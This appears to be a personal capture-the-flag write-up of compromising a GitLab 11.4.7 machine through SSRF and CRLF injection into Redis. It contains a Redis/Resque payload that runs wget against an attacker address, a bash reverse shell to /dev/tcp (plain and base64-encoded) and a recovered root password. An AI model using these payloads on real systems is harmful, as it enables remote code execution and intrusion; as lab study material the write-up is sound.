# Enumeration 

## open ports
```

```


### port 5080
![[Pasted image 20230306030457.png]]
registering an account then logging in
![[Pasted image 20230306033528.png]]
11.4.7 is vulnerable to CVE-2018-19571 (SSRF) + CVE-2018-19585 (CRLF) = RCE 
testing for redis 
`git://[0:0:0:0:0:ffff:127.0.0.1]:6379`
![[Pasted image 20230306045831.png]]
and it hangs which means it did connect to redis server
now we create a new request using Redis commands CRLF 
![[Pasted image 20230306054838.png]]

# Foothold 
using [gitlab_issues](https://gitlab.com/gitlab-org/gitlab-foss/-/issues/41293)
and this repo[repo](https://github.com/jas502n/gitlab-SSRF-redis-RCE)
we can add this code to be read by redis server line by line and get RCE we can first test using wget 
```
multi
sadd resque:gitlab:queues system_hook_push
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|wget 10.10.16.15:9001 \').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
exec
exec
exec
```
![[Pasted image 20230306065021.png]]
in the middle of the request after our URL which is `git%3A%2F%2F%5B0%3A0%3A0%3A0%3A0%3Affff%3A127.0.0.1%5D%3A6379%2Ffoo%2Ffoo.git`
decoded: `git://[0:0:0:0:0:ffff:127.0.0.1]:6379/foo/foo.git`
```
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'| wget 10.10.16.5:9001 \').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
 exec
 exec
```

we get a call back
![[Pasted image 20230306065149.png]]
first to not have many special chars in our reverse shell we gonna base64 the rev shell then decode it
![[Pasted image 20230306065448.png]]
`echo 'bash -i >& /dev/tcp/10.10.16.5/9002 0>&1' | base64`
`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzkwMDIgMD4mMQo= |base64 -d | bash`
![[Pasted image 20230306065633.png]]
first it didn't work but after URL encoding it worked
![[Pasted image 20230306070059.png]]
![[Pasted image 20230306070111.png]]z



# Privesc 



![[Pasted image 20230306070328.png]]
![[Pasted image 20230306071855.png]]
inside /opt/backup we found an smtp password which is also same as root
`wW59U!ZKMbG9+*#h`
now we can mount the disks we found earlier
![[Pasted image 20230306073236.png]]




# Loot
root password
	password: `wW59U!ZKMbG9+*#h`


---
Tags: #ctf #gitlab #SSRF #redis #CRLF  #CVE-2018-19571 #CVE-2018-19585 #docker 
Resources: 
[gitlab_issues](https://gitlab.com/gitlab-org/gitlab-foss/-/issues/41293)
[repo](https://github.com/jas502n/gitlab-SSRF-redis-RCE)
[Automated tool](https://github.com/dotPY-hax/gitlab_RCE)